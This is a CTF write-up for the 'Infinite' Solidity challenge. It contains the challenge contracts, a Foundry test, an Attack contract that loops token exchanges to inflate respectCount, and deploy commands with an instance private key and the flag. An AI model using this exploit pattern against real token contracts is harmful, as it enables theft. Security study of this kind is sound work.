# Infinite

## Challenge

This challenge is also developed using the pardigmCTF framework. We are provided with 5 contracts (3 tokens and 2 custom ones). 

candyToken.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "openzeppelin-contracts/contracts/access/Ownable.sol";

/// @notice You can imagine this contract as candy
contract candyToken is ERC20, Ownable{
  constructor() ERC20('candy', 'candy') {
    
  }
  function mint(address reciever, uint amount) external onlyOwner{
    _mint(reciever, amount);
  }
  function burn(address sender, uint amount) external onlyOwner{
    _burn(sender, amount);
  }
}
```

crewToken.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

/// @notice A token to represent you are a part of the local crew
contract crewToken is ERC20 {
  bool public claimed;
  address public receiver;
  constructor() ERC20('crew', 'crew') {
    claimed = false;
  }

  function mint() external {
    require(!claimed , "already claimed");
    receiver = msg.sender;
    claimed = true;
    _mint(receiver, 1);
  }
}
```

respectToken.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "openzeppelin-contracts/contracts/access/Ownable.sol";

/// @notice You can imagine this contract as respect among gang members
contract respectToken is ERC20, Ownable {
  constructor() ERC20('respect', 'respect') {
  }
  function mint(address reciever, uint amount) external onlyOwner{
    _mint(reciever, amount);
  }
  function burn(address sender, uint amount) external onlyOwner{
    _burn(sender, amount);
  }
}
```

fancyStore.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./candyToken.sol";
import "./respectToken.sol";
import "./crewToken.sol";

/// @notice fancy store sells candies only to respectable members in the gang

contract fancyStore{

    candyToken public immutable candy;
    respectToken public immutable respect;
    crewToken public immutable crew;

    mapping (address=>uint) public respectCount;
    mapping (address=>uint) public timestamp;

    constructor(address candyAddress, address respectAddress, address crewAddress){
        candy = candyToken(candyAddress);
        respect = respectToken(respectAddress);
        crew = crewToken(crewAddress);
    }

    function verification() public payable{
        require(crew.balanceOf(msg.sender)==1, "You don't have crew tokens to verify");
        require(crew.allowance(msg.sender, address(this))==1, "You need to approve the contract to transfer crew tokens");
        
        crew.transferFrom(msg.sender, address(this), 1);

        candy.mint(msg.sender, 10);
    }

    function buyCandies(uint _respectCount) public payable{
            
            require(_respectCount!=0, "You need to donate respect to buy candies");
            require(respect.balanceOf(msg.sender)>=_respectCount, "You don't have enough respect");
            require(respect.allowance(msg.sender, address(this))>=_respectCount, "You need to approve the contract to transfer respect");

            respectCount[msg.sender] += _respectCount;
            respect.transferFrom(msg.sender, address(this), _respectCount);
            timestamp[msg.sender] = block.timestamp;

            candy.mint(msg.sender, _respectCount);
    }

    function respectIncreasesWithTime() public {
        require(timestamp[msg.sender]!=0, "You need to buy candies first");
        require(block.timestamp-timestamp[msg.sender]>=1 days, "You need to wait 1 day to gain respect again");

        timestamp[msg.sender] = block.timestamp;
        uint reward = respectCount[msg.sender]/10;
        respectCount[msg.sender] += reward;
        respect.mint(msg.sender, reward);
    }

    function sellCandies(uint _candyCount) public payable{
        require(_candyCount!=0, "You need to sell at least 1 candy");
        require(candy.balanceOf(msg.sender)>=_candyCount, "You don't have enough candies");
        require(candy.allowance(msg.sender, address(this))>=_candyCount, "You need to approve the contract to transfer candies");

        candy.burn(address(msg.sender), _candyCount);

        respectCount[msg.sender] -= _candyCount;
        respect.transfer(msg.sender, _candyCount);

    }
}
```

localGang.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./respectToken.sol";
import "./candyToken.sol";

/// @notice Gang respects you if you give them treats
contract localGang{

    candyToken public immutable candy;
    respectToken public immutable respect;
    mapping (address=>uint) public candyCount;

    constructor(address candyAddress, address respectAddress){
        candy = candyToken(candyAddress);
        respect = respectToken(respectAddress);
    }

    function gainRespect(uint _candyCount) public payable{

        require(_candyCount!=0, "You need donate candies to gain respect");
        require(candy.balanceOf(msg.sender)>=_candyCount, "You don't have enough candies");
        require(candy.allowance(msg.sender, address(this))>=_candyCount, "You need to approve the contract to transfer candies");

        candyCount[msg.sender] += _candyCount;
        candy.transferFrom(msg.sender, address(this), _candyCount);

        respect.mint(msg.sender, _candyCount);
    }

    function loseRespect(uint _respectCount) public payable{
        require(_respectCount!=0, "You need to lose respect to get back your candies");
        require(respect.balanceOf(msg.sender)>=_respectCount, "You don't have enough respect");
        require(respect.allowance(msg.sender, address(this))>=_respectCount, "You need to approve the contract to transfer respect");

        respect.burn(address(msg.sender), _respectCount);

        candyCount[msg.sender] -= _respectCount;
        candy.transfer(msg.sender, _respectCount);
    }
}
```

Our goal is to get our respectCount variable inside the store over 50.

## Solution

I first used the files provided and my [ParadigmCTFDebugTemplate](https://github.com/J4X-98/SolidityCTFToolkit/blob/main/forge/paradigmTester.sol) to be able to more easily debug. After some playing around I saw that it was pretty easy. There are only a few steps you need to do:
1. Call the mint() function of the CREW token. This works as it is not owner restricted and has not been called before.
2. You use your crew token to call the verification() function of the STORE and get your first 10 candies. 
3. Loop 5+ times and use your 10 candies to receive 10 respect and then exchange these for candies at the store again.
4. You should now have 50+ Respect inside the store and solved the challenge.

```solidity
// Description:
// A forge testcase which you can use to easily debug challenges that were built using the Paradigm CTF framework.


// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
//Import all needed contracts here (they are usually stored in /src in your foundry directory)
import "../src/crewToken.sol";
import "../src/respectToken.sol";
import "../src/candyToken.sol";
import "../src/fancyStore.sol";
import "../src/localGang.sol";

contract ParadigmTest is Test {
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    //Initialize any additional needed variables here
    crewToken public CREW;
    respectToken public RESPECT;
    candyToken public CANDY;
    fancyStore public STORE;
    localGang public GANG;

    function setUp() public {
      vm.deal(deployer, 1337 ether);
        vm.startPrank(deployer);

        //Copy all code from the Setup.sol constructor() function into here
        CREW = new crewToken();
        RESPECT = new respectToken();
        CANDY = new candyToken();   
        STORE = new fancyStore(address(CANDY), address(RESPECT), address(CREW));
        GANG = new localGang(address(CANDY), address(RESPECT));

        RESPECT.transferOwnership(address(GANG));
        CANDY.transferOwnership(address(STORE));

        vm.stopPrank();
    }

    function test() public {
        //30 eth are the standard for the paradigm framework, but this could be configured differently, you can easily check this by importing the rpc url and private key into metamask and checking the balance of the deployer account
        vm.deal(attacker, 5000 ether); 

        //Code your solution here
        vm.startPrank(attacker);

        //call the initialize function as it has not been called before
        CREW.mint();

        //verify at the store
        CREW.approve(address(STORE), 1);
        STORE.verification();

        //buyCandies 
        for (uint i=0; i<10; i++)
        {
            //call the gainRespect function
            CANDY.approve(address(GANG), 10);
            GANG.gainRespect(10);

            //Send the respect to the store to byu candies
            RESPECT.approve(address(STORE), 10);
            STORE.buyCandies(10);
        }
            
        vm.stopPrank();
        
        assertEq(isSolved(), true);
    }

    function isSolved() public view returns (bool) {
        //Copy the content of the isSolved() function from the Setup.sol contract here
        return STORE.respectCount(CREW.receiver())>=50 ;
    }
}
```

As I was too lazy to do all these transactions by hand I decided on developing an attack contract that does everything for me.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./crewToken.sol";
import "./respectToken.sol";
import "./candyToken.sol";
import "./fancyStore.sol";
import "./localGang.sol";
import "./Setup.sol";

contract Attack
{
    crewToken public CREW;
    respectToken public RESPECT;
    candyToken public CANDY;
    fancyStore public STORE;
    localGang public GANG;

    constructor(address setupAddress)
    {
        Setup setup = Setup(setupAddress);
        CREW = setup.CREW();
        RESPECT = setup.RESPECT();
        CANDY = setup.CANDY();
        STORE = setup.STORE();
        GANG = setup.GANG();
    }

    function attack() public
    {
        //call the initialize function as it has not been called before
        CREW.mint();

        //verify at the store
        CREW.approve(address(STORE), 1);
        STORE.verification();

        //buyCandies 
        for (uint i=0; i<10; i++)
        {
            //call the gainRespect function
            CANDY.approve(address(GANG), 10);
            GANG.gainRespect(10);

            //Send the respect to the store
            RESPECT.approve(address(STORE), 10);
            STORE.buyCandies(10);
        }
    }
}
```

I then deployed and ran it using Foundry.

```bash
# uuid:           ddd73c45-dc01-4d62-a206-cadd730efa71
# rpc endpoint:   http://146.148.125.86:60081/ddd73c45-dc01-4d62-a206-cadd730efa71
# private key:    0xc25ac13b663bc400c687f8b5eddd8c7a74cb8b70a171ecede2d69eec26ceb206
# setup contract: 0xBfDee02a5FDa15462FDe09FFe68b6e5B74b7836b

rpc="http://146.148.125.86:60081/ddd73c45-dc01-4d62-a206-cadd730efa71"
priv_key=0xc25ac13b663bc400c687f8b5eddd8c7a74cb8b70a171ecede2d69eec26ceb206
setup_contract=0xBfDee02a5FDa15462FDe09FFe68b6e5B74b7836b

# Deploy the contract
forge create --rpc-url $rpc --constructor-args $setup_contract --private-key $priv_key ./src/Attack.sol:Attack
# Deployed at 0x51836C89540a83Efd0093440271b3AE29F466703
atk_contract=0x51836C89540a83Efd0093440271b3AE29F466703

# Call the attack function
cast send $atk_contract "attack()" --private-key $priv_key --rpc-url $rpc

# Check if it was solved
cast call $setup_contract "isSolved()(bool)" --rpc-url $rpc
```

This yields us the flag crew{inf1nt3_c4n9i3s_1nfinit3_r3s9ect}.